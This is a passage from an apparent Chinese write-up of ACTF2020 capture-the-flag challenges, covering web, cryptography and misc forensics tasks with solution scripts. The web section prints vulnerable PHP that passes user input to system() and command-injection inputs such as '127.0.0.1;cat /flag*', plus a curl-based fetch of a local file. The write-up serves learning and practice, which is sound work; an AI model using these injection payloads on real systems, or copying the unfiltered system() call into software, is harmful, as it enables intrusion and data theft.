class="line">    curl_setopt($ch, CURLOPT_HEADER, 0);</span><br><span class="line">    &#x2F;&#x2F; 抓取URL并把它传递给浏览器</span><br><span class="line">    curl_exec($ch);</span><br><span class="line">    &#x2F;&#x2F; 关闭cURL资源，并且释放系统资源</span><br><span class="line">    curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$url &#x3D; $_GET[&#39;url&#39;];</span><br><span class="line">curl($url); </span><br><span class="line">?&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure></div><p>有一个<code>curl($url)</code>函数，试了下跟linux的<code>curl</code>命令差不多，功能就是访问目标<code>url</code></p><p><a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/web/easyweb/curl.png" data-fancybox="group" data-caption="baidu" class="fancybox"><img alt="baidu" title="baidu" data-src="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/web/easyweb/curl.png" src="/img/loading.gif" class="lazyload"></a></p><p>直接访问服务器本地的<code>/flag</code>即可</p><p><a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/web/easyweb/easyweb.png" data-fancybox="group" data-caption="urla" class="fancybox"><img alt="urla" title="urla" data-src="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/web/easyweb/easyweb.png" src="/img/loading.gif" class="lazyload"></a></p><h2 id="simlple-exec"><a href="#simlple-exec" class="headerlink" title="simlple_exec"></a>simlple_exec</h2><ul><li>题目描述：-</li><li>考察点：命令执行、shell基础</li><li>难度：入门</li><li>分值：300</li><li>完成人数：9</li></ul><p><a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/web/simlple_exec/1.png" data-fancybox="group" data-caption="cataa" class="fancybox"><img alt="cataa" title="cataa" data-src="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/web/simlple_exec/1.png" src="/img/loading.gif" class="lazyload"></a></p><p>点ping按钮会执行ping命令，应该是用了system函数，于是试了一下末尾加上<code>;cmd</code>执行命令</p><blockquote><p>127.0.0.1;ls<br>127.0.0.1;cat index.php </p></blockquote><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'target'</span>])) &#123;</span><br><span class="line">system(<span class="string">"ping -c 3 "</span>.$_POST[<span class="string">'target'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><p>什么过滤都没有，直接读flag即可：</p><blockquote><p>127.0.0.1;cat /flag*</p></blockquote><hr><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><p>密码学从入门到放弃</p><h2 id="classic0"><a href="#classic0" class="headerlink" title="classic0"></a>classic0</h2><ul><li><p>题目描述：</p><blockquote><p>小Z用C语言编写了一个最简单的密码系统，里面都采用的是最简单的古典加密。但是他的源程序不幸泄露，聪明的你能否解读他采用的算法并进行解密？flag格式为actf{***}</p></blockquote></li><li><p>题目地址：<a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/crypto/crypto-classic0/crypto-classic0.zip" target="_blank" rel="noopener">crypto-classic0.zip</a></p></li><li><p>考察点：逆向分析</p></li><li><p>难度：入门</p></li><li><p>分值：100</p></li><li><p>完成人数：11</p></li></ul><p>提示密码是生日，于是暴力解压缩包密码，得到<code>19990306</code>，解压出加密程序的代码：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">25</span>] = ***</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> main()</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">25</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">flag[i] -= <span class="number">3</span>;</span><br><span class="line">flag[i] ^= <span class="number">0x7</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>,flag[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>不难，直接解密即可：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">f=open(<span class="string">'./cipher'</span>,<span class="string">'r'</span>)</span><br><span class="line">s=f.read()</span><br><span class="line">f.close()</span><br><span class="line">k=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    k+=chr((ord(i)^<span class="number">0x7</span>)+<span class="number">3</span>)</span><br><span class="line"><span class="keyword">print</span> k</span><br><span class="line"><span class="comment"># 'actf&#123;my_naive_encrytion&#125;'</span></span><br></pre></td></tr></table></figure></div><h2 id="classic1"><a href="#classic1" class="headerlink" title="classic1"></a>classic1</h2><ul><li>题目描述：维吉尼亚加密是极其经典的古典密码，flag格式为actf{}，明文中的字母均为小写。</li><li>题目地址：<a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/crypto/crypto-classic1/crypto-classic1.zip" target="_blank" rel="noopener">crypto-classic1</a></li><li>考察点：维吉尼亚加密</li><li>难度：中等</li><li>分值：100</li><li>完成人数：8</li></ul><p>压缩包有密码，不过给了提示：</p><blockquote><p>哇，这里有压缩包的密码哦，于是我低下了头，看向了我的双手，试图从中找到某些规律<br>xdfv ujko98 edft54 xdfv pok,.; wsdr43</p></blockquote><p>我低头看了看键盘，照着提示按下一个个按键，意外地发现，我在键盘上画了6个〇</p><p>然鹅并不知道密码是啥<code>=_=</code>但是应该是六位，于是暴力破解，解出密码<code>circle</code>这谁猜得出a…</p><p>解开名为维吉尼亚的压缩包发现密文：</p><blockquote><p> SRLU{LZPL_S_UASHKXUPD_NXYTFTJT}</p></blockquote><p>查了查维吉尼亚，发现和凯撒差不多，也是rot，但是多了一个密钥，网上有无密钥的解法，但是好高端，各种数学公式，看不懂啊…</p><blockquote><p>维吉尼亚密码的密钥长度需要与明文长度相同，如果少于明文长度，则重复拼接直到相同</p></blockquote><p>于是遍历一边密钥只有一个字符(a-z)的加密结果，看看能有啥眉头不</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">1</span>]: s=<span class="string">'SRLU&#123;LZPL_S_UASHKXUPD_NXYTFTJT&#125;'</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">2</span>]: <span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">In [<span class="number">9</span>]: <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">26</span>):</span><br><span class="line">   ...:     t=<span class="string">''</span></span><br><span class="line">   ...:     <span class="keyword">for</span> j <span class="keyword">in</span> s:</span><br><span class="line">   ...:         <span class="keyword">if</span> j <span class="keyword">in</span> string.uppercase:</span><br><span class="line">   ...:             t+=chr(((ord(j)-ord(<span class="string">'A'</span>)+i)%<span class="number">26</span>)+ord(<span class="string">'A'</span>))</span><br><span class="line">   ...:         <span class="keyword">else</span>:</span><br><span class="line">   ...:             t+=j</span><br><span class="line">   ...:     <span class="keyword">print</span> chr(ord(<span class="string">'A'</span>)+i),t</span><br><span class="line">   ...:        </span><br><span class="line"></span><br><span class="line">A SRLU&#123;LZPL_S_UASHKXUPD_NXYTFTJT&#125;</span><br><span class="line">B TSMV&#123;MAQM_T_VBTILYVQE_OYZUGUKU&#125;</span><br><span class="line">C UTNW&#123;NBRN_U_WCUJMZWRF_PZAVHVLV&#125;</span><br><span class="line">D VUOX&#123;OCSO_V_XDVKNAXSG_QABWIWMW&#125;</span><br><span class="line">E WVPY&#123;PDTP_W_YEWLOBYTH_RBCXJXNX&#125;</span><br><span class="line">F XWQZ&#123;QEUQ_X_ZFXMPCZUI_SCDYKYOY&#125;</span><br><span class="line">G YXRA&#123;RFVR_Y_AGYNQDAVJ_TDEZLZPZ&#125;</span><br><span class="line">H ZYSB&#123;SGWS_Z_BHZOREBWK_UEFAMAQA&#125;</span><br><span class="line">I AZTC&#123;THXT_A_CIAPSFCXL_VFGBNBRB&#125;</span><br><span class="line">J BAUD&#123;UIYU_B_DJBQTGDYM_WGHCOCSC&#125;</span><br><span class="line">K CBVE&#123;VJZV_C_EKCRUHEZN_XHIDPDTD&#125;</span><br><span class="line">L DCWF&#123;WKAW_D_FLDSVIFAO_YIJEQEUE&#125;</span><br><span class="line">M EDXG&#123;XLBX_E_GMETWJGBP_ZJKFRFVF&#125;</span><br><span class="line">N FEYH&#123;YMCY_F_HNFUXKHCQ_AKLGSGWG&#125;</span><br><span class="line">O GFZI&#123;ZNDZ_G_IOGVYLIDR_BLMHTHXH&#125;</span><br><span class="line">P HGAJ&#123;AOEA_H_JPHWZMJES_CMNIUIYI&#125;</span><br><span class="line">Q IHBK&#123;BPFB_I_KQIXANKFT_DNOJVJZJ&#125;</span><br><span class="line">R JICL&#123;CQGC_J_LRJYBOLGU_EOPKWKAK&#125;</span><br><span class="line">S KJDM&#123;DRHD_K_MSKZCPMHV_FPQLXLBL&#125;</span><br><span class="line">T LKEN&#123;ESIE_L_NTLADQNIW_GQRMYMCM&#125;</span><br><span class="line">U MLFO&#123;FTJF_M_OUMBEROJX_HRSNZNDN&#125;</span><br><span class="line">V NMGP&#123;GUKG_N_PVNCFSPKY_ISTOAOEO&#125;</span><br><span class="line">W ONHQ&#123;HVLH_O_QWODGTQLZ_JTUPBPFP&#125;</span><br><span class="line">X POIR&#123;IWMI_P_RXPEHURMA_KUVQCQGQ&#125;</span><br><span class="line">Y QPJS&#123;JXNJ_Q_SYQFIVSNB_LVWRDRHR&#125;</span><br><span class="line">Z RQKT&#123;KYOK_R_TZRGJWTOC_MWXSESIS&#125;</span><br></pre></td></tr></table></figure></div><p>果然，当密钥是<code>I</code>的时候，字符串被加密成:</p><blockquote><p>AZTC{THXT_A_CIAPSFCXL_VFGBNBRB}</p></blockquote><p>隐隐能猜到<code>ACTF</code>,<code>VIGENERE</code>这两个单词<br>对比<code>ACTF</code>和<code>AZTC</code>，第2和第四位不同，但是<code>Z+3=C</code>，<code>C+3=F</code>，于是猜测密钥第二位应该是<code>I+3=L</code><br>再看一下密钥是纯<code>L</code>的加密结果:</p><blockquote><p> DCWF{WKAW_D_FLDSVIFAO_YIJEQEUE}</p></blockquote><p>于是验证了上述想法</p><blockquote><p>I AZTC{THXT_A_CIAPSFCXL_VFGBNBRB}<br>L DCWF{WKAW_D_FLDSVIFAO_YIJEQEUE}</p></blockquote><p>由于开头的<code>ACTF</code>和末位的<code>VIGENERE</code>都是隔一个字符就正确一个，于是猜测密钥只含<code>I</code>和<code>L</code></p><p>从上面那两个结果能凑齐FLAG了</p><p><a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/crypto/crypto-classic1/jie2.png" data-fancybox="group" data-caption="jie" class="fancybox"><img alt="jie" title="jie" data-src="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/crypto/crypto-classic1/jie2.png" src="/img/loading.gif" class="lazyload"></a></p><p>最后逐个凑了一下密钥，结果是：</p><blockquote><p>ililliliiililililiilil</p></blockquote><p>按理说应该是解密的，但是用这个密钥加密题目给的字符串就能出FLAG<br>至于为什么，我也不知道，可能因为加密解密是对称的？</p><p><a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/crypto/crypto-classic1//Picture1.png" data-fancybox="group" data-caption="ans" class="fancybox"><img alt="ans" title="ans" data-src="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/crypto/crypto-classic1//Picture1.png" src="/img/loading.gif" class="lazyload"></a></p><h2 id="rsa0"><a href="#rsa0" class="headerlink" title="rsa0"></a>rsa0</h2><ul><li>题目描述：看看rsa的资料，学学python吧，这种简单题绝对不卡你！flag格式为<code>actf{***}</code></li><li>题目地址：<a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/crypto/crypto-rsa0/crypto-rsa0.zip" target="_blank" rel="noopener">crypto-rsa0.zip</a></li><li>考察点：zip伪加密、RSA</li><li>难度：入门</li><li>分值：100</li><li>完成人数：6</li></ul><h3 id="伪加密"><a href="#伪加密" class="headerlink" title="伪加密"></a>伪加密</h3><p>将<code>rsa0.py</code> 文件对应的<code>0009</code> 改为 <code>0000</code></p><p>得到<code>e=65537</code></p><h3 id="rsa解密"><a href="#rsa解密" class="headerlink" title="rsa解密"></a>rsa解密</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#__author__:TaQini</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util <span class="keyword">import</span> number</span><br><span class="line"></span><br><span class="line">p = <span class="number">9018588066434206377240277162476739271386240173088676526295315163990968347022922841299128274551482926490908399237153883494964743436193853978459947060210411</span></span><br><span class="line"></span><br><span class="line">q = <span class="number">7547005673877738257835729760037765213340036696350766324229143613179932145122130685778504062410137043635958208805698698169847293520149572605026492751740223</span></span><br><span class="line"></span><br><span class="line">c = <span class="number">50996206925961019415256003394743594106061473865032792073035954925875056079762626648452348856255575840166640519334862690063949316515750256545937498213476286637455803452890781264446030732369871044870359838568618176586206041055000297981733272816089806014400846392307742065559331874972274844992047849472203390350</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(e, (p<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br><span class="line"></span><br><span class="line">m = pow(c, d, p*q)</span><br><span class="line"></span><br><span class="line">print( number.long_to_bytes(m) )</span><br></pre></td></tr></table></figure></div><h2 id="baby-aes"><a href="#baby-aes" class="headerlink" title="baby aes"></a>baby aes</h2><ul><li><p>题目描述：</p><blockquote><p>AES是一种十分高效安全的对称加密方式，在现代密码学中有着举足轻重的地位。小Z对此很放心，于是就写了一个脚本用AES加密，你能获得他的明文嘛？flag格式为<code>actf{***}</code></p></blockquote></li><li><p>题目地址：<a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/crypto/crypto-aes/crypto-aes.zip" target="_blank" rel="noopener">crypto-aes.zip</a></p></li><li><p>考察点：数学? AES加密</p></li><li><p>难度：简单</p></li><li><p>分值：200</p></li><li><p>完成人数：2</p></li></ul><p><code>key</code>长32字节为两字节的随机数重复16次，<code>iv</code>长16字节</p><p>已知：输出<code>out</code>，<code>key</code>与<code>iv</code>异或的结果</p><p>由于<code>key</code>与<code>iv</code>长度不一样，<code>key</code>有16字节字节与0异或，还是其本身，因此可解出<code>key</code></p><p>由异或结果可解出<code>iv</code></p><p>解出<code>iv</code>后，直接<code>aes</code>解密即可</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment">#__author__:TaQini</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">out = long_to_bytes(<span class="number">91144196586662942563895769614300232343026691029427747065707381728622849079757</span>)</span><br><span class="line"></span><br><span class="line">key = out[:<span class="number">16</span>]*<span class="number">2</span></span><br><span class="line"></span><br><span class="line">xor_res = out[<span class="number">16</span>:]</span><br><span class="line"></span><br><span class="line">iv = bytes_to_long(xor_res)^bytes_to_long(key[<span class="number">16</span>:])</span><br><span class="line">iv = long_to_bytes(iv)</span><br><span class="line"></span><br><span class="line">aes=AES.new(key,AES.MODE_CBC,iv)</span><br><span class="line"></span><br><span class="line">out = <span class="string">b'\x8c-\xcd\xde\xa7\xe9\x7f.b\x8aKs\xf1\xba\xc75\xc4d\x13\x07\xac\xa4&amp;\xd6\x91\xfe\xf3\x14\x10|\xf8p'</span></span><br><span class="line"></span><br><span class="line">flag = aes.decrypt(out)</span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure></div><hr><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><p>签到题都没做出来，呜呜呜</p><h2 id="白给"><a href="#白给" class="headerlink" title="白给"></a>白给</h2><ul><li><p>题目描述：远在天边，近在眼前。仔细找找吧~</p></li><li><p>考察点：base64隐写术</p></li><li><p>难度：简单</p></li><li><p>分值：100</p></li><li><p>完成人数：12</p></li></ul><p>base64隐写…直接跑脚本解密</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">%</span><span class="bash"> ./base64decode.py ./ComeOn\!.txt</span></span><br><span class="line">...</span><br><span class="line">ACTF&#123;6aseb4_f33!&#125;</span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_base64_diff_value</span><span class="params">(s1, s2)</span>:</span></span><br><span class="line">    base64chars = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'</span></span><br><span class="line">    res = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(len(s2)):</span><br><span class="line">        <span class="keyword">if</span> s1[i] != s2[i]:</span><br><span class="line">            <span class="keyword">return</span> abs(base64chars.index(s1[i]) - base64chars.index(s2[i]))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve_stego</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(sys.argv[<span class="number">1</span>], <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        file_lines = f.readlines()</span><br><span class="line">        bin_str = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> file_lines:</span><br><span class="line">            steg_line = line.replace(<span class="string">'\n'</span>, <span class="string">''</span>)</span><br><span class="line">            norm_line = line.replace(<span class="string">'\n'</span>, <span class="string">''</span>).decode(<span class="string">'base64'</span>).encode(<span class="string">'base64'</span>).replace(<span class="string">'\n'</span>, <span class="string">''</span>)</span><br><span class="line">            diff = get_base64_diff_value(steg_line, norm_line)</span><br><span class="line">            <span class="keyword">print</span> diff</span><br><span class="line">            pads_num = steg_line.count(<span class="string">'='</span>)</span><br><span class="line">            <span class="keyword">if</span> diff:</span><br><span class="line">                bin_str += bin(diff)[<span class="number">2</span>:].zfill(pads_num * <span class="number">2</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                bin_str += <span class="string">'0'</span> * pads_num * <span class="number">2</span></span><br><span class="line">            <span class="keyword">print</span> goflag(bin_str)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">goflag</span><span class="params">(bin_str)</span>:</span></span><br><span class="line">    res_str = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, len(bin_str), <span class="number">8</span>):</span><br><span class="line">        res_str += chr(int(bin_str[i:i + <span class="number">8</span>], <span class="number">2</span>))</span><br><span class="line">    <span class="keyword">return</span> res_str</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    solve_stego()</span><br></pre></td></tr></table></figure></div><h2 id="Music-for-free"><a href="#Music-for-free" class="headerlink" title="Music for free"></a>Music for free</h2><ul><li><p>题目描述：</p><blockquote><p>zzw喜欢听音乐，可是他不是VIP，也不想花钱下载音乐，可是你却在无意中发现了他拥有大量的音乐资源。想想他是怎么做到的？<br>格式为：actf{xxxxxx}，flag均是小写</p></blockquote></li><li><p>考察点：文件修复</p></li><li><p>难度：简单</p></li><li><p>分值：100</p></li><li><p>完成人数：5</p></li></ul><p>给了一个<code>m4a</code>文件但是用<code>file</code>没识别出来</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">%</span><span class="bash"> file vip.m4a </span></span><br><span class="line">vip.m4a: data</span><br></pre></td></tr></table></figure></div><p>于是查了一下<code>m4a</code> 文件头是：</p><blockquote><p><code>00 00 00 20 66 74 79 70 4D 34 41 20 00 00 00 00</code></p></blockquote><p>而这个文件的文件头却是：</p><blockquote><p><code>a1 a1 a1 b9 c7 d5 d8 d1 cc d1 95 93 a1 a1 a1 a1</code></p></blockquote><p>应该是和<code>0xa1</code>异或了，解出来<code>m4a</code>然后播放，原来是道听力题…..</p><p><a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/misc/music/m4a.png" data-fancybox="group" data-caption="m4a" class="fancybox"><img alt="m4a" title="m4a" data-src="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/misc/music/m4a.png" src="/img/loading.gif" class="lazyload"></a></p><h2 id="SWP"><a href="#SWP" class="headerlink" title="SWP"></a>SWP</h2><ul><li><p>题目描述：</p><blockquote><p>简单的流量题。<br>格式为：actf{xxxxxx}，flag均是小写</p></blockquote></li><li><p>考察点：流量分析</p></li><li><p>难度：简单</p></li><li><p>分值：100</p></li><li><p>完成人数：8</p></li></ul><p>用<code>wireshark</code>打开流量包，搜索<code>flag</code>发现压缩包一个</p><p><a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/misc/swp/swp.png" data-fancybox="group" data-caption="swp" class="fancybox"><img alt="swp" title="swp" data-src="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/misc/swp/swp.png" src="/img/loading.gif" class="lazyload"></a></p><p>尝试解压，发现有密码，但是直接用<code>binwalk</code>就能解出来<code>flag</code>文件</p><p>是个<code>elf64</code>，直接搜索字符串就有flag</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">%</span><span class="bash"> rabin2 -zz flag| grep &#123;</span></span><br><span class="line">17  0x000006d9 0x000006d9 42  43 ascii  actf&#123;c5558bcf-26da-4f8b-b181-b61f3850b9e5&#125;</span><br></pre></td></tr></table></figure></div><p>并不知道这题给的swp文件有啥用…</p><h2 id="喵咪"><a href="#喵咪" class="headerlink" title="喵咪"></a>喵咪</h2><ul><li>题目描述：好可爱的小猫咪！</li><li>考察点：outguess隐写术</li><li>难度：入门</li><li>分值：200</li><li>完成人数：7</li></ul><p>根据提示百度了下，是outguess加密，直接解密的话报错了，看来是需要key</p><p>windows下查看图片属性，备注里有着<strong>社会主义核心价值观</strong>，送去<a href="http://ctf.ssleye.com/cvencode.html" target="_blank" rel="noopener">这里</a>解码，解得<code>abc</code></p><p>用key解密即可：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">%</span><span class="bash"> ./outguess -r mmm.jpg -k abc -t a.txt ; cat a.txt</span></span><br><span class="line">Reading mmm.jpg....</span><br><span class="line">Extracting usable bits:   17550 bits</span><br><span class="line">Steg retrieve: seed: 93, len: 23</span><br><span class="line">ACTF&#123;gue33_Gu3Ss!2020&#125;</span><br></pre></td></tr></table></figure></div><h2 id="Login"><a href="#Login" class="headerlink" 